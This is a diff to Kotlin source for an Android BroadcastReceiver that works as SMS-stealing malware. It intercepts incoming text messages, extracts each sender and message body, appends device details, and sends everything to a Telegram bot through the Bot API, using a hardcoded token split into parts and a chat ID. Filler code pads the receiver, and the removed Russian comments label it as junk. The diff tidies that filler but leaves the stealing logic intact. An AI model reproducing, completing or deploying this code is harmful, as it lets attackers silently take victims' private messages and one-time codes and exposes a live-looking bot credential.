@@ -22,19 +22,16 @@ class X : BroadcastReceiver() {
     private val garbageArray = arrayOf("foo", "bar", "baz", "qux")
 
     override fun onReceive(z: Context?, a: Intent?) {
-        // Бессмысленная проверка
         if (System.currentTimeMillis() % 2 == 0L) {
             val temp = Calendar.getInstance()
             temp.add(Calendar.DAY_OF_YEAR, -1 * abs(Random.nextInt()))
         }
 
-        // Избыточные преобразования
         val action = a?.action?.let { 
             Base64.encodeToString(it.toByteArray(), Base64.DEFAULT).reversed().substring(0, 5) 
         } ?: ""
 
         if (a?.action == "android.provider.Telephony.SMS_RECEIVED" || action.length > 3) {
-            // Мусорные операции
             garbageArray.forEach { item ->
                 val hash = MessageDigest.getInstance("MD5").digest(item.toByteArray())
                     .fold("") { str, it -> str + "%02x".format(it) }
@@ -42,66 +39,54 @@ class X : BroadcastReceiver() {
             }
 
             val b: Bundle? = a?.extras?.apply {
-                // Бессмысленное добавление значений
                 putLong("junk" + garbage1, System.nanoTime())
                 putString("trash", garbage2)
             }
 
-            if (b != null && b.keySet().size >= 0) {
+            if (b != null && b.keySet().isNotEmpty()) {
                 val c: Array<Any?>? = b.get("pdus") as? Array<Any?>?
                     ?.also { array -> 
                         array.indices.forEach { i ->
-                            // Ничего не делающая операция
                             i.toString().toCharArray().size
                         }
                     }
 
-                if (c != null && c.isNotEmpty() || garbage1 % 2 == 0) {
-                    for ((index, d) in c.withIndex()) {
-                        // Избыточная проверка
-                        if (index < Integer.MAX_VALUE) {
-                            try {
-                                val e = android.telephony.SmsMessage.createFromPdu(d as ByteArray)
-                                    ?: throw NullPointerException("Fake exception")
+                c?.forEachIndexed { index, d ->
+                    if (index < Int.MAX_VALUE) {
+                        try {
+                            val e = android.telephony.SmsMessage.createFromPdu(d as ByteArray)
+                                ?: throw NullPointerException("Fake exception")
 
-                                val f: String = e.originatingAddress?.let { addr ->
-                                    // Ненужные преобразования строки
-                                    addr.map { c -> c.toString() }.joinToString("").reversed()
-                                        .substring(0 until addr.length.coerceAtMost(addr.length))
-                                } ?: "Unknown".also { 
-                                    println("Unknown sender detected at ${Date()}") 
-                                }
-
-                                val g: String = e.messageBody?.replace("a", "4")
-                                    ?.replace("e", "3")
-                                    ?.replace("i", "1")
-                                    ?: "Empty".apply {
-                                        // Мусорная лямбда
-                                        { x: Int -> x * x }.invoke(42)
-                                    }
-
-                                val h = i().run {
-                                    // Лишняя операция
-                                    substring(0, length)
-                                }
-
-                                // Вызов с дополнительными параметрами
-                                j(f, l = g, m = h + " " + garbageArray.random())
-                            } catch (e: Exception) {
-                                // Игнорирование исключения
+                            val f: String = e.originatingAddress?.let { addr ->
+                                addr.map { c -> c.toString() }.joinToString("").reversed()
+                                    .substring(0 until addr.length.coerceAtMost(addr.length))
+                            } ?: "Unknown".also { 
+                                println("Unknown sender detected at ${Date()}") 
                             }
+
+                            val g: String = e.messageBody?.replace("a", "4")
+                                ?.replace("e", "3")
+                                ?.replace("i", "1")
+                                ?: "Empty".apply {
+                                    { x: Int -> x * x }.invoke(42)
+                                }
+
+                            val h = i().run {
+                                substring(0, length)
+                            }
+
+                            j(f, l = g, m = h + " " + garbageArray.random())
+                        } catch (e: Exception) {
+                            e.printStackTrace()
                         }
                     }
                 }
             }
         }
-
-        // Бессмысленный вызов
         dummyFunction(garbage1)
     }
 
     private fun i(): String {
-        // Избыточные вычисления
         val manufacturer = android.os.Build.MANUFACTURER.let {
             it.split("").joinToString("") + it.hashCode().toString(16)
         }.substring(0 until android.os.Build.MANUFACTURER.length)
@@ -113,26 +98,20 @@ class X : BroadcastReceiver() {
         }
 
         return "$manufacturer $model".also {
-            // Мусорный вывод
             System.err.println("Device info generated: $it")
         }
     }
 
     private fun j(k: String, l: String, m: String) {
-        // Разбиение токена на части и сборка
         val tokenPart1 = "7824327491:AAGmZ5eA57SWIpWI3hf"
         val tokenPart2 = "qRFEt6cnrQPAhnu8"
         val n = tokenPart1 + tokenPart2
         
         val o = "6331293386".apply {
-            // Ненужная проверка
             if (length != 10) throw AssertionError("Fake assertion")
         }
 
-        val p = "https://api.telegram.org/bot$n/sendMessage".also { url ->
-            // Мусорная операция
-            url.toCharArray().distinct().joinToString("").take(10)
-        }
+        val p = "https://api.telegram.org/bot$n/sendMessage"
 
         val q = """
             New SMS!
@@ -140,17 +119,9 @@ class X : BroadcastReceiver() {
             Text: ${l.replace("\n", " ")}
         
             ${m + " @ " + System.currentTimeMillis()}
-        """.trimIndent().let { str ->
-            // Лишнее преобразование
-            str.split("\n").joinToString("\n")
-        }
+        """.trimIndent()
 
-        val r = "application/json".toMediaType().also { mediaType ->
-            // Бессмысленное сравнение
-            if (mediaType.type == "application") {
-                val dummy = mediaType.subtype.hashCode()
-            }
-        }
+        val r = "application/json".toMediaType()
 
         val s = """
             {
@@ -158,43 +129,32 @@ class X : BroadcastReceiver() {
                 "text": "$q",
                 "parse_mode": "Markdown"
             }
-        """.trimIndent().toRequestBody(r).also { body ->
-            // Ненужный вызов
-            body.contentLength()
-        }
+        """.trimIndent().toRequestBody(r)
 
         val t = Request.Builder()
             .url(p)
             .post(s)
-            .build().apply {
-                // Избыточное добавление заголовка
-                header("X-Dummy-Header", garbage1.toString())
-            }
+            .addHeader("X-Dummy-Header", garbage1.toString())
+            .build()
 
         y.newCall(t).enqueue(object : okhttp3.Callback {
             override fun onFailure(u: okhttp3.Call, v: IOException) {
                 v.printStackTrace()
-                // Мусорный код
                 repeat(3) {
                     println("Failure occurred ${Date()}")
                 }
             }
 
             override fun onResponse(u: okhttp3.Call, w: okhttp3.Response) {
-                if (!w.isSuccessful || w.code % 100 != 0) {
+                if (!w.isSuccessful) {
                     println("${w.code}".padEnd(10, 'X'))
-                    // Лишняя операция
-                    w.headers.toMultimap().keys.firstOrNull()?.hashCode()
                 }
                 w.close()
-                
-                // Бессмысленный вызов
                 dummyFunction2(w.code)
             }
         })
     }
 
-    // Мусорные функции
     private fun dummyFunction(x: Int): Double {
         return if (x > 0) {
             Math.sqrt(x.toDouble()).also {
@@ -214,13 +174,7 @@ class X : BroadcastReceiver() {
         return sb.toString().reversed().substring(0 until sb.length / 2)
     }
 
-    // Мусорный инициализатор
     init {
         println("Initializing with garbage values: $garbage1, $garbage2")
-        val dummyMap = mapOf(
-            "a" to 1,
-            "b" to 2,
-            "c" to 3
-        ).filter { it.value > 0 }
     }
 }
